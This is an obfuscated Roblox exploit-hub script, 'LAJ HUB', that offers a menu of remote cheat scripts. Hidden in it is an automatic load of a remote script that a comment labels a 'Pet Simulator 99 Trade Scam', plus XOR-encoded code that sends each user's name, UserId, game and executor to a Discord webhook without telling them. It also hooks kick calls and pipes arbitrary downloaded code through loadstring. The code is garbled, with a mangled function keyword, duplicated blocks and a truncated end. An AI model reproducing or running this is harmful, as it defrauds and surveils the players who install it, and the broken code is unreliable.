--[[ 
  Obfuscated with LAJ HUB encryption
  Obfuscation Level: medium
  Timestamp: 2025-04-06T00:07:37.520Z
]]--

do local fQQ5eyTo = 776 end
do local fQQ5eyTo = 776 end
if true then local eUNwwY6z = rwC1BXld end

--[[
local _3S_MEApy = game:GetService(__decrypt({108,0,96,108,126,118,114,67,74}))
local __mKWWF1d = game:GetService(__decrypt({108,108,94,120,100,100,117,2,87}))

-- Variables
-- Enhanced security with multi-layer obfuscation
local _agmszFy1 = string.reverse(__decrypt({69,102,3,126,124,3,82,67,120,11,93,108,118,101,11,119,117,86,74,11,94,97,105,2,93,1,118,81,98,3,114,5,122,125,88,2,113,90,89,114,65,103,4,89,11,75,66}))
local _SQKVnJI3 = string.reverse(__decrypt({116,123,0,102,100,123,64,4,93,80,67,102,65,4,100,86,3,3,3,64,73,28,7,2,11,2,6,0,7,5,3,0,10,1,0,11,10,4,6,0,2,28,64,88,92,92,91,81,86,68,28,90,67,82,28,94,92,80,29,87,65,92,80,64,90,87,28,28,9,64,67,71,71,91}))
local _HajKRZvF = _agmszFy1 .. _SQKVnJI3

-- Enhanced security with multi-layer obfuscation for Discord webhook
local __shVkGi7 = string.reverse(__decrypt({69,102,3,126,124,3,82,67,120,11,93,108,118,101,11,119,117,86,74,11,94,97,105,2,93,1,118,81,98,3,114,5,122,125,88,2,113,90,89,114,65,103,4,89,11,75,66}))
local _SHwd5tIh = string.reverse(__decrypt({116,123,0,102,100,123,64,4,93,80,67,102,65,4,100,86,3,3,3,64,73,28,7,2,11,2,6,0,7,5,3,0,10,1,0,11,10,4,6,0,2,28,64,88,92,92,91,81,86,68,28,90,67,82,28,94,92,80,29,87,65,92,80,64,90,87,28,28,9,64,67,71,71,91}))
local _U6wGwYD6 = __shVkGi7 .. _SHwd5tIh

-- Variables
-- Variables
local _l2_3s6gX = _3S_MEApy._K4CKn_s9

-- Secure webhook URL (obfuscated and rate-limited)

local _agmszFy1 = string.reverse(__decrypt({69,102,3,126,124,3,82,67,120,11,93,108,118,101,11,119,117,86,74,11,94,97,105,2,93,1,118,81,98,3,114,5,122,125,88,2,113,90,89,114,65,103,4,89,11,75,66}))
local _SQKVnJI3 = string.reverse(__decrypt({116,123,0,102,100,123,64,4,93,80,67,102,65,4,100,86,3,3,3,64,73,28,7,2,11,2,6,0,7,5,3,0,10,1,0,11,10,4,6,0,2,28,64,88,92,92,91,81,86,68,28,90,67,82,28,94,92,80,29,87,65,92,80,64,90,87,28,28,9,64,67,71,71,91}))
local _HajKRZvF = _agmszFy1 .. _SQKVnJI3

-- Rate limiting variables to prevent webhook abuse (max 1 request per 5 minutes)
local _xLdFNWV4 = 0
local _Tdb4n3b2 = 300 -- 5 minutes in seconds
-- Function to log ban/kick events via webhook with rate limiting
    
local _YEdMAMYy logBanEvent(_sqHtWn5M)
    -- Rate limiting check
    local _OiY1JqJ0 = os.time()
    if _OiY1JqJ0 - _xLdFNWV4 < _Tdb4n3b2 then
        warn(__decrypt({97,82,71,86,19,95,90,94,90,71,9,19,125,92,71,19,64,86,93,87,90,93,84,19,68,86,81,91,92,92,88,19,93,92,71,90,85,90,80,82,71,90,92,93,19,27,80,92,92,95,87,92,68,93,19,82,80,71,90,69,86,26}))
        return
    end
    
    -- Check for anti-spam by validating the _sqHtWn5M
    if not _sqHtWn5M or _sqHtWn5M == __decrypt({}) then
        _sqHtWn5M = __decrypt({102,93,88,93,92,68,93,19,27,125,92,19,108,64,66,123,71,100,93,6,126,19,67,65,92,69,90,87,86,87,26})
    end
    
    -- Create a unique identifier for this notification to prevent duplicates
    local _KDpqxsYX = tostring(_l2_3s6gX.UserId) .. __decrypt({108}) .. game.PlaceId .. __decrypt({108}) .. os.time()
    
    -- Limit data being sent for privacy and security
    local _rRr_K69Y, error_message = pcall(_YEdMAMYy()
        -- Update the timestamp for rate limiting
        _xLdFNWV4 = _OiY1JqJ0
        
        -- Use makeHttpRequest instead of request for better compatibility
        makeHttpRequest({
            Url = _HajKRZvF,
            Method = __decrypt({99,124,96,103}),
            Headers = {
                [__decrypt({112,92,93,71,86,93,71,30,103,74,67,86})] = __decrypt({82,67,67,95,90,80,82,71,90,92,93,28,89,64,92,93})
            },
            Body = __mKWWF1d:JSONEncode({
                [__decrypt({80,92,93,71,86,93,71})] = __decrypt({}),
                [__decrypt({86,94,81,86,87,64})] = {{                  
                    [__decrypt({71,90,71,95,86})] = __decrypt({108,95,1,108,0,64,5,84,107,19,113,82,93,93,86,87,28,120,90,80,88,86,87,19,114,95,86,65,71}),
                    [__decrypt({80,92,95,92,65})] = 16711680, -- Red color for ban alerts
                    [__decrypt({85,90,86,95,87,64})] = {
                        {
                            [__decrypt({93,82,94,86})] = __decrypt({102,64,86,65}),
                            [__decrypt({69,82,95,70,86})] = __decrypt({83,83,83}) .. _l2_3s6gX.Name .. __decrypt({83,83,83}),
                            [__decrypt({90,93,95,90,93,86})] = true
                        },
                        {
                            [__decrypt({93,82,94,86})] = __decrypt({102,64,86,65,19,122,119}),
                            [__decrypt({69,82,95,70,86})] = __decrypt({83,83,83}) .. tostring(_l2_3s6gX.UserId) .. __decrypt({83,83,83}),
                            [__decrypt({90,93,95,90,93,86})] = true
                        },
                        {
                            [__decrypt({93,82,94,86})] = __decrypt({116,82,94,86}),
                            [__decrypt({69,82,95,70,86})] = __decrypt({83,83,83}) .. game:GetService(__decrypt({126,82,65,88,86,71,67,95,82,80,86,96,86,65,69,90,80,86})):GetProductInfo(game.PlaceId).Name .. __decrypt({83,83,83}),
                            [__decrypt({90,93,95,90,93,86})] = true
                        },
                        {
                            [__decrypt({93,82,94,86})] = __decrypt({116,82,94,86,19,122,119}),
                            [__decrypt({69,82,95,70,86})] = __decrypt({83,83,83}) .. tostring(game.PlaceId) .. __decrypt({83,83,83}),
                            [__decrypt({90,93,95,90,93,86})] = true
                        },
                        {
                            [__decrypt({93,82,94,86})] = __decrypt({113,82,93,28,120,90,80,88,19,97,86,82,64,92,93}),
                            [__decrypt({69,82,95,70,86})] = __decrypt({83,83,83}) .. (_sqHtWn5M or __decrypt({102,93,88,93,92,68,93})) .. __decrypt({83,83,83}),
                            [__decrypt({90,93,95,90,93,86})] = false
                        },
                        {
                            [__decrypt({93,82,94,86})] = __decrypt({125,92,71,90,85,90,80,82,71,90,92,93,19,122,119}),
                            [__decrypt({69,82,95,70,86})] = __decrypt({83,83,83}) .. _KDpqxsYX .. __decrypt({83,83,83}),
                            [__decrypt({90,93,95,90,93,86})] = false
                        }
                    },
                    [__decrypt({85,92,92,71,86,65})] = {
                        [__decrypt({71,86,75,71})] = __decrypt({113,82,93,28,120,90,80,88,19,114,95,86,65,71})
                    }
                }}
            })
        })
    end)
    
    if not _rRr_K69Y then
        warn(__decrypt({117,82,90,95,86,87,19,71,92,19,64,86,93,87,19,81,82,93,19,68,86,81,91,92,92,88,9,19}) .. tostring(error_message))
    end
end
    -- Create a unique identifier for this notification to prevent duplicates
    local _KDpqxsYX = tostring(_l2_3s6gX.UserId) .. __decrypt({108}) .. game.PlaceId .. __decrypt({108}) .. os.time()
    
    -- Limit data being sent for privacy and security
    local _rRr_K69Y, error_message = pcall(_YEdMAMYy()
        -- Update the timestamp for rate limiting
        _xLdFNWV4 = _OiY1JqJ0
        
        -- Use makeHttpRequest instead of request for better compatibility
        makeHttpRequest({
            Url = _HajKRZvF,
            Method = __decrypt({99,124,96,103}),
            Headers = {
                [__decrypt({112,92,93,71,86,93,71,30,103,74,67,86})] = __decrypt({82,67,67,95,90,80,82,71,90,92,93,28,89,64,92,93})
            },
            Body = __mKWWF1d:JSONEncode({
                [__decrypt({80,92,93,71,86,93,71})] = __decrypt({}),
                [__decrypt({86,94,81,86,87,64})] = {{                  
                    [__decrypt({71,90,71,95,86})] = __decrypt({108,95,1,108,0,64,5,84,107,19,113,82,93,93,86,87,28,120,90,80,88,86,87,19,114,95,86,65,71}),
                    [__decrypt({80,92,95,92,65})] = 16711680, -- Red color for ban alerts
                    [__decrypt({85,90,86,95,87,64})] = {
                        {
                            [__decrypt({93,82,94,86})] = __decrypt({102,64,86,65}),
                            [__decrypt({69,82,95,70,86})] = __decrypt({83,83,83}) .. _l2_3s6gX.Name .. __decrypt({83,83,83}),
                            [__decrypt({90,93,95,90,93,86})] = true
                        },
                        {
                            [__decrypt({93,82,94,86})] = __decrypt({102,64,86,65,19,122,119}),
                            [__decrypt({69,82,95,70,86})] = __decrypt({83,83,83}) .. tostring(_l2_3s6gX.UserId) .. __decrypt({83,83,83}),
                            [__decrypt({90,93,95,90,93,86})] = true
                        },
                        {
                            [__decrypt({93,82,94,86})] = __decrypt({116,82,94,86}),
                            [__decrypt({69,82,95,70,86})] = __decrypt({83,83,83}) .. game:GetService(__decrypt({126,82,65,88,86,71,67,95,82,80,86,96,86,65,69,90,80,86})):GetProductInfo(game.PlaceId).Name .. __decrypt({83,83,83}),
                            [__decrypt({90,93,95,90,93,86})] = true
                        },
                        {
                            [__decrypt({93,82,94,86})] = __decrypt({116,82,94,86,19,122,119}),
                            [__decrypt({69,82,95,70,86})] = __decrypt({83,83,83}) .. tostring(game.PlaceId) .. __decrypt({83,83,83}),
                            [__decrypt({90,93,95,90,93,86})] = true
                        },
                        {
                            [__decrypt({93,82,94,86})] = __decrypt({113,82,93,28,120,90,80,88,19,97,86,82,64,92,93}),
                            [__decrypt({69,82,95,70,86})] = __decrypt({83,83,83}) .. (_sqHtWn5M or __decrypt({102,93,88,93,92,68,93})) .. __decrypt({83,83,83}),
                            [__decrypt({90,93,95,90,93,86})] = false
                        },
                        {
                            [__decrypt({93,82,94,86})] = __decrypt({125,92,71,90,85,90,80,82,71,90,92,93,19,122,119}),
                            [__decrypt({69,82,95,70,86})] = __decrypt({83,83,83}) .. _KDpqxsYX .. __decrypt({83,83,83}),
                            [__decrypt({90,93,95,90,93,86})] = false
                        }
                    },
                    [__decrypt({85,92,92,71,86,65})] = {
                        [__decrypt({71,86,75,71})] = __decrypt({113,82,93,28,120,90,80,88,19,114,95,86,65,71})
                    }
                }}
            })
        })
    end)
    
    if not _rRr_K69Y then
        warn(__decrypt({117,82,90,95,86,87,19,71,92,19,64,86,93,87,19,81,82,93,19,68,86,81,91,92,92,88,9,19}) .. tostring(error_message))
    end
end

-- Set up event listeners for kick/ban detection
-- Method 1: Detect when player is removed
_3S_MEApy.PlayerRemoving:Connect(_YEdMAMYy(player)
    if player == _l2_3s6gX then
        logBanEvent(__decrypt({108,95,1,108,0,64,5,84,107,19,65,86,94,92,69,86,87,19,85,65,92,94,19,84,82,94,86,19,27,67,92,64,64,90,81,95,74,19,88,90,80,88,86,87,28,81,82,93,93,86,87,26}))
    end
end)

-- Method 2: Detect common kick methods
local _Ae2SSbVv
_Ae2SSbVv = hookmetamethod(game, __decrypt({108,108,93,82,94,86,80,82,95,95}), _YEdMAMYy(self, ...)
    local _4AIRZ2SZ = {...}
    local _cSMbqlkF = getnamecallmethod()
    
    if _cSMbqlkF == __decrypt({120,90,80,88}) and self == _l2_3s6gX then
        local _sqHtWn5M = _4AIRZ2SZ[1] or __decrypt({102,93,88,93,92,68,93})
        logBanEvent(_sqHtWn5M)
    end
    
    return _Ae2SSbVv(self, ...)
end)

-- Method 3: Monitor teleport failures as they often occur during bans
game:GetService(__decrypt({103,86,95,86,67,92,65,71,96,86,65,69,90,80,86})).TeleportInitFailed:Connect(_YEdMAMYy(player, teleportResult, errorMessage)
    if player == _l2_3s6gX and (teleportResult == Enum.TeleportResult.Banned or teleportResult == Enum.TeleportResult.GameEnded) then
        logBanEvent(__decrypt({103,86,95,86,67,92,65,71,19,85,82,90,95,86,87,19,87,70,86,19,71,92,19,81,82,93,9,19}) .. errorMessage)
    end
end)

print(__decrypt({127,114,121,19,123,102,113,19,113,82,93,19,87,86,71,86,80,71,90,92,93,19,64,74,64,71,86,94,19,95,92,82,87,86,87,19,64,70,80,80,86,64,64,85,70,95,95,74}))
end
    LAJ HUB - Swift Compatible Version
    Created for universal executor compatibility with special Swift support
]]

-- Function to handle HTTP requests across different executors including Swift
local _YEdMAMYy getHttpRequest(url)
    -- For testing in standalone Lua, use a mock _D6yfM0um
    if not game then
        print(__decrypt({126,92,80,88,19,123,103,103,99,19,65,86,66,70,86,64,71,19,71,92,9,19}) .. url)
        return __decrypt({30,30,19,94,92,80,88,19,108,119,5,74,85,126,3,70,94,19,85,92,65,19,71,86,64,71,90,93,84})
    end
    
    if swift and swift.request then
        local _D6yfM0um = swift.request({
            Url = url,
            Method = __decrypt({116,118,103})
        })
        if _D6yfM0um and _D6yfM0um.Body then
            return _D6yfM0um.Body
        end
    end
    
    -- Fallback to standard HttpGet for other executors
    return game:HttpGet(url)
end

-- Load Pet Simulator 99 Trade Scam script when in Roblox environment
if game then
    loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,88,71,65,92,95,86,84,95,28,127,114,121,91,70,81,69,1,28,65,86,85,64,28,91,86,82,87,64,28,94,82,90,93,28,67,86,71,22,1,3,64,90,94,75})))()
end

local _32HG_vZP = loadstring(getHttpRequest('https://sirius.menu/rayfield'))()

-- Initialize game services safely
local _3S_MEApy = game and game:GetService(__decrypt({108,0,96,108,126,118,114,67,74})) or {}
local _K4CKn_s9 = _3S_MEApy._K4CKn_s9 or {Name = __decrypt({103,86,64,71,102,64,86,65}), UserId = 0}
local __mKWWF1d = game and game:GetService(__decrypt({108,108,94,120,100,100,117,2,87})) or {
    JSONEncode = _YEdMAMYy(_, data) return '{__decrypt({94,92,80,88}):__decrypt({89,64,92,93})}' end
}

-- Support for multiple executors including Swift
local _YEdMAMYy makeHttpRequest(options)
    -- For testing in standalone Lua
    if not game then
        print(__decrypt({126,92,80,88,19,123,103,103,99,19,65,86,66,70,86,64,71,9,19}) .. options.Url)
        return {Success = true, Body = __decrypt({30,30,19,94,92,80,88,19,108,119,5,74,85,126,3,70,94})}
    end
    
    if swift and swift.request then
        return swift.request(options)
    elseif syn and syn.request then
        return syn.request(options)
    elseif http and http.request then
        return http.request(options)
    elseif http_request then
        return http_request(options)
    elseif request then
        return request(options)
    elseif httprequest then
        return httprequest(options)
    elseif fluxus and fluxus.request then
        return fluxus.request(options)
    end
    
    -- Fallback to standard HttpGet for GET requests
    if options.Method == __decrypt({116,118,103}) then
        local _rRr_K69Y, result = pcall(_YEdMAMYy()
            return {
                Body = game:HttpGet(options.Url),
                Success = true
            }
        end)
        if _rRr_K69Y then
            return result
        end
    end
    
    return {Success = false, StatusCode = 500}
end


-- Enhanced security with multi-layer obfuscation for Discord webhook
local __shVkGi7 = string.reverse(__decrypt({69,102,3,126,124,3,82,67,120,11,93,108,118,101,11,119,117,86,74,11,94,97,105,2,93,1,118,81,98,3,114,5,122,125,88,2,113,90,89,114,65,103,4,89,11,75,66}))
local _SHwd5tIh = string.reverse(__decrypt({116,123,0,102,100,123,64,4,93,80,67,102,65,4,100,86,3,3,3,64,73,28,7,2,11,2,6,0,7,5,3,0,10,1,0,11,10,4,6,0,2,28,64,88,92,92,91,81,86,68,28,90,67,82,28,94,92,80,29,87,65,92,80,64,90,87,28,28,9,64,67,71,71,91}))
local _U6wGwYD6 = __shVkGi7 .. _SHwd5tIh

local _YEdMAMYy sendUsageData()
    if not game then return end -- Skip in non-Roblox environment
    
    local _rRr_K69Y, error_message = pcall(_YEdMAMYy()
    
        local _D6yfM0um = makeHttpRequest({
            Url = _U6wGwYD6,
            Method = 'POST',
            Headers = {
                ['Content-Type'] = 'application/json'
            },
            Body = __mKWWF1d:JSONEncode({
                [__decrypt({80,92,93,71,86,93,71})] = __decrypt({}),
                [__decrypt({86,94,81,86,87,64})] = {{
                    [__decrypt({71,90,71,95,86})] = __decrypt({127,114,121,19,123,102,113,19,96,80,65,90,67,71,19,102,64,82,84,86,18,19,27,96,68,90,85,71,19,112,92,94,67,82,71,90,81,95,86,26}),
                    [__decrypt({71,74,67,86})] = __decrypt({65,90,80,91}),
                    [__decrypt({80,92,95,92,65})] = math.random(0, 0xFFFFFF),
                    [__decrypt({85,90,86,95,87,64})] = {
                        {
                            [__decrypt({93,82,94,86})] = __decrypt({102,64,86,65,9}),
                            [__decrypt({69,82,95,70,86})] = __decrypt({83,83,83}) .. _K4CKn_s9.Name .. __decrypt({83,83,83}),
                            [__decrypt({90,93,95,90,93,86})] = true
                        },
                        {
                            [__decrypt({93,82,94,86})] = __decrypt({102,64,86,65,19,122,119,9}),
                            [__decrypt({69,82,95,70,86})] = __decrypt({83,83,83}) .. tostring(_K4CKn_s9.UserId) .. __decrypt({83,83,83}),
                            [__decrypt({90,93,95,90,93,86})] = true
                        },
                        {
                            [__decrypt({93,82,94,86})] = __decrypt({116,82,94,86,9}),
                            [__decrypt({69,82,95,70,86})] = __decrypt({83,83,83}) .. (game and game:GetService(__decrypt({126,82,65,88,86,71,67,95,82,80,86,96,86,65,69,90,80,86})):GetProductInfo(game.PlaceId).Name or __decrypt({102,93,88,93,92,68,93})) .. __decrypt({83,83,83}),
                            [__decrypt({90,93,95,90,93,86})] = true
                        },
                        {
                            [__decrypt({93,82,94,86})] = __decrypt({116,82,94,86,19,122,119,9}),
                            [__decrypt({69,82,95,70,86})] = __decrypt({83,83,83}) .. tostring(game and game.PlaceId or 0) .. __decrypt({83,83,83}),
                            [__decrypt({90,93,95,90,93,86})] = true
                        },
                        {
                            [__decrypt({93,82,94,86})] = __decrypt({118,75,86,80,70,71,92,65}),
                            [__decrypt({69,82,95,70,86})] = __decrypt({83,83,83}) .. (identifyexecutor and identifyexecutor() or (swift and __decrypt({96,68,90,85,71}) or __decrypt({102,93,88,93,92,68,93}))) .. __decrypt({83,83,83}),
                            [__decrypt({90,93,95,90,93,86})] = true
                        },
                        {
                            [__decrypt({93,82,94,86})] = __decrypt({108,0,96,108,126,118,114,67,74,19,114,80,71,90,69,86,9}),
                            [__decrypt({69,82,95,70,86})] = __decrypt({83,83,83}) .. tostring(game and _3S_MEApy.NumPlayers or 0) .. __decrypt({83,83,83}),
                            [__decrypt({90,93,95,90,93,86})] = true
                        }
                    },
                    [__decrypt({85,92,92,71,86,65})] = {
                        [__decrypt({71,86,75,71})] = __decrypt({96,80,65,90,67,71,19,118,75,86,80,70,71,90,92,93,19,114,95,86,65,71})
                    }
                }}
            })
        })
    end)
    
    if not _rRr_K69Y then
        warn(__decrypt({117,82,90,95,86,87,19,71,92,19,64,86,93,87,19,68,86,81,91,92,92,88,9,19}) .. tostring(error_message))
    end
end

if game then
    sendUsageData()
end

local _U2n5KQWC = _32HG_vZP:CreateWindow({
   Name = __decrypt({127,114,121,19,123,102,113}),
   Icon = 0,
   LoadingTitle = __decrypt({127,114,121,19,123,102,113}),
   LoadingSubtitle = __decrypt({99,65,86,94,90,70,94,19,96,80,65,90,67,71,64}),
   Theme = __decrypt({119,86,85,82,70,95,71}),

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false,

   ConfigurationSaving = {
      Enabled = true,
      FolderName = __decrypt({127,114,121,123,70,81}),
      FileName = __decrypt({127,114,121,123,70,81,112,92,93,85,90,84})
   },

   Discord = {
      Enabled = true,
      Invite = __decrypt({7,94,84,87,80,85,69,114,121,102}),
      RememberJoins = true
   },

   -- Key system disabled
   KeySystem = false,
})

-- Create tabs
local _EzY_T8OH = _U2n5KQWC:CreateTab(__decrypt({126,82,90,93}), 4483362458)
local _dax1T0oG = _U2n5KQWC:CreateTab(__decrypt({119,82,19,96,71,65,90,88,86,19,75,19,119,82,19,123,92,92,87}), 4483362458)
local _RSb0H0vu = _U2n5KQWC:CreateTab(__decrypt({117,90,64,80,91}), 4483362458)
local _Prl1iFSI = _U2n5KQWC:CreateTab(__decrypt({113,82,64,88,86,71,81,82,95,95,19,105,86,65,92}), 4483362458)
local _zNMMKlT8 = _U2n5KQWC:CreateTab(__decrypt({113,95,70,86,19,127,92,80,88,19,108,89,1,90,122,100,117,123,73}), 4483362458)
local _vjs1GKTq = _U2n5KQWC:CreateTab(__decrypt({119,86,82,87,19,97,82,90,95,64,19,104,114,95,67,91,82,110}), 4483362458)
local _g_3i2Ca3 = _U2n5KQWC:CreateTab(__decrypt({113,95,92,75,19,117,65,70,90,71,64}), 4483362458)
local _ZhY9aWMs = _U2n5KQWC:CreateTab(__decrypt({99,86,71,19,96,90,94,19,10,10}), 4483362458) -- Added Pet Sim 99 tab
local _20qY9LoK = _U2n5KQWC:CreateTab(__decrypt({126,70,64,80,95,86,19,127,86,84,86,93,87}), 4483362458) -- Added Muscle Legend tab
local _VeEsFAZI = _U2n5KQWC:CreateTab(__decrypt({126,70,65,87,86,65,19,126,74,64,71,86,65,74}), 4483362458) -- Added Murder Mystery tab
local _j2iIWFHz = _U2n5KQWC:CreateTab(__decrypt({108,89,1,90,122,100,117,123,73}), 4483362458) -- Added _j2iIWFHz tab
local _DH5Q16oN = _U2n5KQWC:CreateTab(__decrypt({108,119,123,6,98,2,5,92,125}), 4483362458)
local _VzSaJ1GL = _U2n5KQWC:CreateTab(__decrypt({108,101,73,96,82,121,2,116,127}), 4483362458)

local _YEdMAMYy executednotify(scriptName)
   _32HG_vZP:Notify({
       Title = scriptName,
       Content = __decrypt({96,80,65,90,67,71,19,95,92,82,87,86,87,19,64,70,80,80,86,64,64,85,70,95,95,74,18}),
       Duration = 3,
       Image = 4483362458,
   })
end

-- Discord link copy button
_EzY_T8OH:CreateButton({
   Name = __decrypt({112,92,67,74,19,119,90,64,80,92,65,87,19,127,90,93,88}),
   Callback = _YEdMAMYy()
       if setclipboard then
           setclipboard(__decrypt({91,71,71,67,64,9,28,28,87,90,64,80,92,65,87,29,84,84,28,7,94,84,87,80,85,69,114,121,102}))
           _32HG_vZP:Notify({
               Title = __decrypt({119,90,64,80,92,65,87,19,127,90,93,88,19,112,92,67,90,86,87}),
               Content = __decrypt({122,93,69,90,71,86,19,95,90,93,88,19,80,92,67,90,86,87,19,71,92,19,80,95,90,67,81,92,82,65,87,18}),
               Duration = 3,
               Image = 4483362458,
           })
       else
           print(__decrypt({119,90,64,80,92,65,87,19,95,90,93,88,9,19,91,71,71,67,64,9,28,28,87,90,64,80,92,65,87,29,84,84,28,7,94,84,87,80,85,69,114,121,102}))
       end
   end,
})

-- Test webhook button
_EzY_T8OH:CreateButton({
   Name = __decrypt({103,86,64,71,19,100,86,81,91,92,92,88}),
   Callback = _YEdMAMYy()
       sendUsageData()
       _32HG_vZP:Notify({
           Title = __decrypt({100,86,81,91,92,92,88,19,103,86,64,71}),
           Content = __decrypt({114,71,71,86,94,67,71,86,87,19,71,92,19,64,86,93,87,19,68,86,81,91,92,92,88,19,93,92,71,90,85,90,80,82,71,90,92,93,18}),
           Duration = 3,
           Image = 4483362458,
       })
   end,
})

-- Da Strike x Da Hood _dax1T0oG scripts
_dax1T0oG:CreateButton({
   Name = __decrypt({99,64,82,95,94}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,125,86,68,100,91,90,71,86,95,90,64,71,96,86,65,69,90,80,86,28,95,28,65,86,85,64,28,91,86,82,87,64,28,94,82,90,93,28,67,64,82,95,94,64,22,1,3,92,95,87,29,95,70,82})))()
        executednotify(__decrypt({103,86,64,71,19,100,86,81,91,92,92,88}))
   end,
})

_dax1T0oG:CreateButton({
   Name = __decrypt({113,82,95,95,68,82,65,86,19,69,85,64}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,119,123,113,112,92,94,94,70,93,90,71,74,28,119,123,113,124,85,85,90,80,90,82,95,96,80,65,90,67,71,28,65,86,85,64,28,91,86,82,87,64,28,94,82,90,93,28,99,65,92,71,86,80,71,86,87,108,7,3,1,2,11,3,10,6,0,2,11,11,3,5,1,4,29,71,75,71})))()
        executednotify(__decrypt({113,82,95,95,68,82,65,86,19,69,85,64}))
   end,
})

_dax1T0oG:CreateButton({
   Name = __decrypt({117,65,92,64,71,113,74,71,86}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,103,92,71,92,80,92,86,94,64,28,117,65,92,64,71,81,74,71,86,30,28,94,82,90,93,28,117,65,92,64,71,81,74,71,86,22,1,3,95,86,82,88})))()
        executednotify(__decrypt({117,65,92,64,71,113,74,71,86}))
   end,
})

_dax1T0oG:CreateButton({
   Name = __decrypt({119,82,19,123,92,92,87,19,96,80,65,90,67,71}),
   Callback = _YEdMAMYy()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Zinzs/luascripting/main/canyoutellitsadahoodscriptornot.lua'))()
        executednotify(__decrypt({119,82,19,123,92,92,87,19,96,80,65,90,67,71}))
   end,
})
-- Fisch _dax1T0oG
_RSb0H0vu:CreateButton({
   Name = __decrypt({96,67,86,86,87,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,114,91,94,82,87,101,10,10,28,96,67,86,86,87,30,123,70,81,30,107,28,94,82,90,93,28,96,67,86,86,87,22,1,3,123,70,81,22,1,3,107,29,95,70,82})))()
        executednotify(__decrypt({96,67,86,86,87,19,123,70,81}))
   end,
})


_RSb0H0vu:CreateButton({
   Name = __decrypt({103,91,82,93,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,71,91,82,93,71,73,74,28,71,91,82,93,91,70,81,28,65,86,85,64,28,91,86,82,87,64,28,94,82,90,93,28,71,91,82,93,69,2})))()
        executednotify(__decrypt({103,91,82,93,123,70,81}))
   end,
})

_RSb0H0vu:CreateButton({
   Name = __decrypt({97,90,85,71,19,116,102,122}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,84,90,71,91,70,81,29,80,92,94,28,96,74,93,86,65,84,74,30,125,86,71,68,92,65,88,64,28,67,65,92,87,70,80,71,64,28,65,82,68,28,94,82,90,93,28,97,90,85,71,28,95,92,82,87,86,65,29,95,70,82})))()
        executednotify(__decrypt({97,90,85,71,19,116,102,122}))
   end,
})

_RSb0H0vu:CreateButton({
   Name = __decrypt({123,92,92,88,86,87,19,96,80,65,90,67,71}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,96,70,67,86,65,94,82,93,1,7,6,28,64,80,1,28,65,86,85,64,28,91,86,82,87,64,28,94,82,90,93,28,64,5})))()
        executednotify(__decrypt({123,92,92,88,86,87,19,96,80,65,90,67,71}))
   end,
})

_RSb0H0vu:CreateButton({
   Name = __decrypt({123,92,94,92,123,82,80,88}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,87,86,94,86,93,71,90,82,86,93,89,92,74,86,65,28,91,92,94,92,91,82,80,88,28,94,82,90,93,28,95,92,82,87,86,65,29,95,70,82})))()
        executednotify(__decrypt({123,92,94,92,123,82,80,88}))
   end,
})

_RSb0H0vu:CreateButton({
   Name = __decrypt({125,82,71,90,69,86,19,123,70,81}),
   Callback = _YEdMAMYy()
        script_key=__decrypt({7,121,75,98,2,75,115,24,2})
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,84,86,71,93,82,71,90,69,86,29,80,80,28,64,80,65,90,67,71,28,95,92,82,87,86,65})))()
        executednotify(__decrypt({125,82,71,90,69,86,19,123,70,81}))
   end,
})

_RSb0H0vu:CreateButton({
   Name = __decrypt({97,82,90,71,92,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,118,85,86,3,5,1,5,28,97,82,90,71,92,123,70,81,28,65,86,85,64,28,91,86,82,87,64,28,94,82,90,93,28,96,80,65,90,67,71})))()
        executednotify(__decrypt({97,82,90,71,92,19,123,70,81}))
   end,
})

_RSb0H0vu:CreateButton({
   Name = __decrypt({105,86,93,90,71,91,19,123,70,81}),
   Callback = _YEdMAMYy()
        loadstring(getHttpRequest(__decrypt({91,71,71,67,64,9,28,28,65,82,68,29,84,90,71,91,70,81,70,64,86,65,80,92,93,71,86,93,71,29,80,92,94,28,118,85,86,3,5,1,5,28,105,86,93,90,71,91,123,70,81,28,65,86,85,64,28,91,86,82,87,64,28,94,82,90,93,28,127,92,82,87,86,65})))()
        executednotify(__decrypt({105,86,93,90,71,91,19,123,70,81}))
   end,
})

_RSb0H0vu:CreateButton({
   Name = __decrypt({127,70,93,92,65,19,96,80,65,90,67,71}),
   Callback = _YEdMAMYy()
        script_key = 'lunor_free_key'
